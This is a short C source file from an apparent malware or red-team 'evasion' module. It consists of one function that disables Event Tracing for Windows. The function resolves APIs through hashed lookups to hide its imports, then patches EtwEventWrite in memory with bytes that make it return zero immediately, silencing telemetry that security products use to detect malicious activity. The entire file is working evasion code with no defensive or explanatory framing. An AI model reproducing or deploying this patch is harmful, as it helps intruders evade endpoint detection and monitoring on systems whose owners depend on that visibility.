#include "evasion.h"


// Disable ETW by patching EtwEventWrite to return 0
int disable_etw(void) {
    HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH); // Load Ntdll module
    
    VirtualProtectEx_t _ProtectVirtMem = (VirtualProtectEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_PROTECT_HASH);
    FlushInstructionCache_t _FlushInstructionCache = (FlushInstructionCache_t)CustomGetProcAddress(hKernel32dll, FLUSH_INSTRUCTION_CACHE_HASH);
    EtwEventWrite_t _EtwEventWrite = (EtwEventWrite_t)CustomGetProcAddress(hNtdll, ETW_EVENT_WRITE_HASH);

    // Will save original protection
	DWORD oldprotect = 0;

    // Set new page protection
	_ProtectVirtMem((HANDLE)-1,_EtwEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

    // Overwrite ETW Event Write function
	memcpy(_EtwEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret

    // Rollback page permission
	_ProtectVirtMem((HANDLE)-1,_EtwEventWrite, 4096, oldprotect, &oldprotect);

    // Flush instruction cache
	_FlushInstructionCache((HANDLE)-1, _EtwEventWrite, 4096);
	return 0;
}